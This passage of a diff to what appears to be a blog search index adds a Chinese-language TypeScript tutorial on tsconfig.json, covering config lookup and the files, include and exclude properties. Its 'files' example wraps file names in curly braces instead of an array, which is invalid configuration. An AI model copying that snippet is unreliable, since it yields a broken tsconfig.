class="class"><span class="keyword">class</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">    greeting: string;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(message: string) &#123;</span><br><span class="line">        <span class="built_in">this</span>.greeting = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @validate</span><br><span class="line">    greet(@required name: string) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;, &quot;</span> + <span class="built_in">this</span>.greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="7、配置文件"><a href="#7、配置文件" class="headerlink" title="7、配置文件"></a>7、配置文件</h5><p>Typescript项目的配置文件为<code>tsconfig.json</code></p>
+<h6 id="使用配置文件"><a href="#使用配置文件" class="headerlink" title="使用配置文件"></a>使用配置文件</h6><ul>
+<li>不带任何输入文件的情况下调用<code>tsc</code>，编译器会从当前目录开始去查找<code>tsconfig.json</code>文件，逐级向上搜索父目录。</li>
+<li>不带任何输入文件的情况下调用<code>tsc</code>，且使用命令行参数<code>--project</code>（或<code>-p</code>）指定一个包含<code>tsconfig.json</code>文件的目录。</li>
+</ul>
+<h6 id="files属性"><a href="#files属性" class="headerlink" title="files属性"></a>files属性</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;files&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;index.ts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;index2.ts&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>指定编译哪些文件</p>
+<h6 id="include属性"><a href="#include属性" class="headerlink" title="include属性"></a>include属性</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;include&quot;</span>: [<span class="string">&#x27;src/**/*.ts&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译<code>src</code>目录下所有的<code>.ts</code>后缀的文件</p>
+<h6 id="exclude属性"><a href="#exclude属性" class="headerlink" title="exclude属性"></a>exclude属性</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;exclude&quot;</span>: [<span class="string">&quot;node_modules&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译时排除<code>node_modules</code>文件夹</p>
+<h6 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h6><blockquote>
+<p>如果一个glob模式里的某部分只包含<code>*</code>或<code>.*</code>，那么仅有支持的文件扩展名类型被包含在内（比如默认<code>.ts</code>，<code>.tsx</code>，和<code>.d.ts</code>， 如果 <code>allowJs</code>设置能<code>true</code>还包含<code>.js</code>和<code>.jsx</code>）。</p>
+<p>如果<code>&quot;files&quot;</code>和<code>&quot;include&quot;</code>都没有被指定，编译器默认包含当前目录和子目录下所有的TypeScript文件（<code>.ts</code>, <code>.d.ts</code> 和 <code>.tsx</code>），排除在<code>&quot;exclude&quot;</code>里指定的文件。JS文件（<code>.js</code>和<code>.jsx</code>）也被包含进来如果<code>allowJs</code>被设置成<code>true</code>。 如果指定了 <code>&quot;files&quot;</code>或<code>&quot;include&quot;</code>，编译器会将它们结合一并包含进来。 使用 <code>&quot;outDir&quot;</code>指定的目录下的文件永远会被编译器排除，除非你明确地使用<code>&quot;files&quot;</code>将其包含进来（这时就算用<code>exclude</code>指定也没用）</p>
+</blockquote>
+<h6 id="编译选项属性"><a href="#编译选项属性" class="headerlink" title="编译选项属性"></a>编译选项属性</h6><p>详细编译选项属性请参考：<a href="https://www.tslang.cn/docs/handbook/compiler-options.html">编译器选项</a></p>
+]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>Typescript</tag>
       </tags>
   </entry>
 </search>
